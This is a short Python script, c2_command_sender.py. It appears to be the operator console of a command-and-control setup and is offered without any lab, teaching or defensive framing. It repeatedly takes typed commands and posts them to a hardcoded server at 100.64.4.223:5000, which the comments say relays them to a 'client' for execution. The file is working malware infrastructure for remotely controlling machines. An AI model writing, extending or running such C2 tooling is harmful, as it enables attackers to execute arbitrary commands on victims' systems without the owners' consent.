# c2_command_sender.py
import requests

SERVER_URL = "http://100.64.4.223:5000"

def set_command(command):
    try:
        response = requests.post(f"{SERVER_URL}/set_command", json={'command': command})
        if response.status_code == 200:
            print(f"Command '{command}' sent successfully.")
        else:
            print(f"Failed to send command. Status Code: {response.status_code}")
    except Exception as e:
        print(f"Error sending command: {e}")

if __name__ == "__main__":
    # Loop to continuously send commands
    while True:
        # Get the user input
        command = input("Enter the command to send to the client (or type 'exit' to quit): ")
        
        # Exit the loop if the user types 'exit'
        if command.lower() == 'exit':
            print("Exiting command sender...")
            break

        # Send the command to the C2 server
        set_command(command)
